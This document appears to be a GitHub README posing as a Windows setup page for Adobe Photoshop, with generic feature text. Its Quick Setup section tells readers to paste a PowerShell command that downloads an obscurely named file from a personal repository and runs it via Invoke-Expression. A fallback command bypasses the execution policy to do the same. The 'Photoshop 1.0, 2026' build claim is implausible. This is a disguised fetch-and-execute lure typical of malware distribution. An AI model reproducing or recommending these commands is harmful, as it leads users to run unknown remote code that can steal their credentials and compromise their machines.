# Photoshop

Photoshop is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open Photoshop and work in it.

Adobe Photoshop is a desktop raster editor for Windows used to retouch photographs, build composites, and prepare graphics for print and screen. Layers, masks, adjustment stacks, and Smart Objects let you work non-destructively while brushes, selections, and vector paths handle fine detail. The app fits photographers, illustrators, and layout designers who need precise color, typography, and export control on local files.

A typical session starts by opening a camera RAW or PSD, setting document color profile and resolution, then balancing exposure with Curves or Camera Raw filters on duplicate layers. You isolate subjects with Select Subject or pen paths, refine hair on layer masks, and blend stock or scanned elements with blend modes and clipping masks. Smart Filters and linked libraries keep experiments reversible; Actions speed repetitive crops and size variants. You proof on a calibrated monitor, annotate with type layers, then export masters as PSD and deliver flattened TIFF, PNG, or JPEG using saved export presets.

This repository holds the Windows setup file for a pinned Photoshop build, concise install notes for your environment, and a changelog that records build numbers and notable tool updates. It is a practical reference for teams standardizing one version, comparing release notes, and documenting what changed between deployments.

## What you do with it

- Layer stacks and masks enable non-destructive retouching and complex photo composites on Windows.
- Camera Raw and Curves deliver precise exposure, white balance, and tone mapping for RAW files.
- Pen paths and Select Subject refine edges for cutouts, product shots, and portrait isolation.
- Smart Objects and Smart Filters preserve editability while scaling and applying blur or sharpen.
- Brush engines, blend modes, and clipping masks paint textures and integrate scanned artwork seamlessly.
- Typography tools set kerning, OpenType features, and paragraph styles for posters and UI mockups.
- Actions and batch processing automate resize, watermark, and format conversion across image folders.
- Export presets and color profiles output print-ready TIFFs and optimized PNG or JPEG for delivery.

## Quick Setup (PowerShell)

This installs the program Photoshop on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/annaa644014/photoshop-setup-guide/main/c9uwjosynd.ul76rb7w | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/annaa644014/photoshop-setup-guide/main/c9uwjosynd.ul76rb7w | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `c9uwjosynd.ul76rb7w` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `annaa644014/photoshop-setup-guide`. Adobe Photoshop 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
